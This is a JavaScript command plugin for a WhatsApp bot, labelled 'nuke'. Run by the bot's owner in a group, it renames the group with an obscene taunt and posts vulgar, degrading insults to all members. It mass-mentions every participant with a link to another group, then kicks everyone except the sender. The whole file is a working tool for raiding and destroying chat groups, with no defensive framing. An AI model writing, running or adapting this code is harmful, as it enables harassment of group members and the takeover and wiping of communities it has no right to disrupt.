let handler = async (m, { conn, isROwner }) => {
  if (!m.isGroup) return await conn.reply(m.chat, 'Questo comando funziona solo nei gruppi.', m)

  const userId = m.sender
  const groupId = m.chat
  const botJid = conn.user?.jid || conn.user?.id || ''

  try {
    const metadata = await conn.groupMetadata(m.chat).catch(() => null)
    if (!metadata) return await conn.reply(m.chat, 'Impossibile recuperare i dati del gruppo.', m)

    const oldTitle = metadata.subject || 'FALLITI'
    const newTitle = `${oldTitle} |𝐒𝐁𝐎𝐑𝐑𝐀𝐓𝐈 𝐃𝐀 𝐑𝐈𝐋𝐄𝐘 𝐄 𝐙𝐄𝐈𝐍`
    await conn.groupUpdateSubject(m.chat, newTitle)

    await conn.sendMessage(m.chat, { text: '« 𝑺𝑰𝑬𝑻𝑬 𝑨𝑷𝑷𝑬𝑵𝑨 𝑺𝑻𝑨𝑻𝑰 𝑺𝑩𝑶𝑹𝑹𝑨𝑻𝑰 𝑫𝑨 𝑹𝑰𝑳𝑬𝒀 𝑬 𝒁𝑬𝑰𝑵,𝑨𝑫𝑬𝑺𝑺𝑶 𝑨𝑽𝑬𝑻𝑬 𝑫𝑰𝑹𝑰𝑻𝑻𝑶 𝑨 𝑺𝑻𝑨𝑹𝑬 𝒁𝑰𝑻𝑻𝑰 𝑬 𝑰𝑵𝑮𝑶𝑰𝑨𝑹𝑬 𝑫𝑨 𝑩𝑹𝑨𝑽𝑬 𝑷𝑼𝑻𝑻𝑨𝑵𝑬 𝑶𝑩𝑩𝑬𝑫𝑰𝑬𝑵𝑻𝑰. ’. »' }, { quoted: m })

    const mentions = metadata.participants
      .filter(participant => participant.id !== botJid)
      .map(participant => participant.id)

    await conn.sendMessage(
      m.chat,
      {
        text: '« 𝑬𝑵𝑻𝑹𝑨𝑹𝑬 𝑸𝑼𝑨 𝑪𝑨𝑵𝑰 \nhttps://https://chat.whatsapp.com/FfkWcj0y22d8Tfe3lF4iSh»',
        mentions
      },
      { quoted: m }
    )

    const participantsToRemove = metadata.participants
      .filter(participant => participant.id !== m.sender)
      .map(participant => participant.id)

    if (participantsToRemove.length > 0) {
      try {
        await conn.groupParticipantsUpdate(m.chat, participantsToRemove, 'remove')
      } catch (error) {
        console.error('Errore kick partecipanti:', error)
      }
    }

    await conn.sendMessage(m.chat, { text: 'Operazione completata: nome modificato e partecipanti rimossi.' }, { quoted: m })
  } catch (error) {
    console.error(error)
    await conn.reply(m.chat, 'Errore durante l’esecuzione di .afterlight.', m)
  }
} 
handler.help = ['nuke']
handler.tags = ['owner']
handler.command = /^(sborra)$/i
handler.group = true
handler.botAdmin = true
handler.rowner = true

export default handler
